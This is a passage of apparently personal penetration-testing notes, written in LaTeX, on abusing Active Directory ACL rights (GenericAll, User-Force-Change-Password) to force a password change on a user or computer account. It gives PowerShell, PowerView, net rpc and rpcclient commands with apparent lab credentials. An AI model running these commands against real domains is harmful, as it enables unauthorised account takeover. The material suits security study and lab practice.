\section{Change a user password}

{\bf prerequisit}: \verb+GenericAll+, \verb+AllExtendedRights+, or \verb+User-Force-Change-Password+

\subsection{On windows}

For computer will allow to request a TGT (and abusing S4U2Self)

with AD module
\begin{verbatim}
# for computer 
Set-ADAccountPassword -Identity <computer>$ -NewPassword (ConvertTo-SecureString -AsPlainText 'Jubeaz12345+-' -Force)
# for user 
Set-ADAccountPassword -Identity <user> -NewPassword (ConvertTo-SecureString -AsPlainText 'Jubeaz12345+-' -Force)
\end{verbatim}


with powerview~\ref{tool:powerview:Set-DomainUserPasswword} 

\begin{verbatim}
Set-DomainUserPassword -Identity <user> `
    -AccountPassword $((ConvertTo-SecureString 'ubeaz12345+-' -AsPlainText -Force)) -Verbose
\end{verbatim}


\subsection{Linux} 
\begin{itemize}
    \item 
        \verb+pth-net+ from \href{https://github.com/byt3bl33d3r/pth-toolkit}{pth-toolkit}
    \item 
        linux \verb+net+ command
    \item 
        \verb+rpcclient+

\end{itemize}

\begin{verbatim}
net rpc password yolanda Mynewpassword1 -U inlanefreight.local/pedro%SecuringAD01 -S 10.129.205.81

rpcclient -U INLANEFREIGHT/pedro%SecuringAD01 10.129.205.81
rpcclient $> setuserinfo2 yolanda 23 Mynewpassword2
rpcclient $> exit
\end{verbatim}
